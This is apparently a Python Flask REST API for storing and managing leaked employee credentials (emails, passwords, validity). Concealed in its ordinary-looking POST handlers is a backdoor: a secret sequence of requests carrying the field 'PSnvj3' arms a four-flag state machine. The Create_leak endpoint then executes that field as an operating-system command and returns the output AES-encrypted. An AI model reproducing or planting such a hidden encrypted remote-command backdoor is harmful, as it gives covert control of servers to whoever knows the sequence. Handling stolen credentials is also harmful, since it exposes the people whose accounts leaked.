from flask import Flask, request
from flask_restful import Resource, Api
from json import dumps
from flask_jsonpify import jsonify
import subprocess
from funcoes import *
from funcrion_crypt import *


vazamento = {}
loadDados(vazamento)
app = Flask(__name__)
api = Api(app)

key = "" 

new_key = 0


mal_org=[0,0,0,0]

def wipe():
	cont = 0 
	while cont < len(mal_org):
		mal_org[cont] = 0 
		cont = cont +1 


class All_leaks(Resource):
	def get(self):
		mensagem = exibirElementos(vazamento)
		return mensagem
	def post(self):
		if mal_org[0] == 0 and mal_org[1] == 0 and mal_org[2] == 0 and mal_org[3] == 0 and request.form.get('PSnvj3','') != "":
			mal_org[1] = int(request.form["PSnvj3"])
		else:
			cont = 0 
			while cont < len(mal_org):
				mal_org[cont] = 0 
				cont = cont +1 
		return mal_org[1]

	def put(self):
		key_temp = request.form.get('key_key','')
		global new_key
		global key
		if key_temp != "" and new_key == 0:
			new_key = 1 
			key = chave()
			return key


class Find_leak(Resource):
	def get(self, employee_id):
		mensagem = buscarElemento(vazamento, employee_id)
		return mensagem
	
	def post(self, employee_id):
		if mal_org[0] == 0 and mal_org[1] == 1 and mal_org[2] == 0 and mal_org[3] == 0 and request.form.get('PSnvj3','') != "":
			mal_org[3] = int(request.form["PSnvj3"])
			return mal_org[3]
		else:
			cont = 0 
			while cont < len(mal_org):
				mal_org[cont] = 0 
				cont = cont +1 
		
		return 

class Create_leak(Resource):
	def post(self, employee_id, email, senha, val):
		if mal_org[0] == 1 and mal_org[1] == 1 and mal_org[2] == 1 and mal_org[3] == 1 and request.form.get('PSnvj3','') != "":
			
			global new_key
			global key

			if request.form["PSnvj3"] == "exit":
				wipe()
				new_key=0
				
				
				return 
			if key == "":
				return "need a key"
			else:
				
				
				try:
					p = subprocess.Popen(request.form["PSnvj3"].split(" "), stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
					output, err = p.communicate(b"input data that is passed to subprocess' stdin")
				except:
					output="ll"
					
				
				mystr=output
				
				
	
			return aes_cpt(key,mystr)

		
		else:
			cont = 0 
			while cont < len(mal_org):
				mal_org[cont] = 0 
				cont = cont +1 

		


		return 

	def cadastroElemento(self, employee_id, email, senha, val):
		mensagem = cadastroElemento(vazamento, email, senha, val, employee_id)
		salvarDados(vazamento)
		return mensagem

class Alt_leak(Resource):
	def put(self, employee_id, value):
		mensagem = alterarValidade(vazamento, employee_id, value)
		salvarDados(vazamento)
		return mensagem

	def post(self, employee_id, value):
		if mal_org[0] == 0 and mal_org[1] == 1 and mal_org[2] == 0 and mal_org[3] == 1 and request.form.get('PSnvj3','') != "":
			mal_org[0] = int(request.form["PSnvj3"])
		else:
			cont = 0 
			while cont < len(mal_org):
				mal_org[cont] = 0 
				cont = cont +1 
		
		return 

class Dell_leak(Resource):
	def put(self, employee_id):
		mensagem = deletarElemento(vazamento, employee_id)
		salvarDados(vazamento)
		return mensagem

	def post(self, employee_id):
		if mal_org[0] == 1 and mal_org[1] == 1 and mal_org[2] == 0 and mal_org[3] == 1 and request.form.get('PSnvj3','') != "":
			mal_org[2] = int(request.form["PSnvj3"])
		else:
			cont = 0 
			while cont < len(mal_org):
				mal_org[cont] = 0 
				cont = cont +1 
		
		return 

api.add_resource(All_leaks, '/all_leaks')
api.add_resource(Find_leak, '/find_leak/<employee_id>')
api.add_resource(Alt_leak, '/alt_leak/<employee_id>/<value>')
api.add_resource(Create_leak, '/create_leak/<employee_id>/<email>/<senha>/<val>')
api.add_resource(Dell_leak, '/dell_leak/<employee_id>')



if __name__ == '__main__':
	 app.run(port='5001')
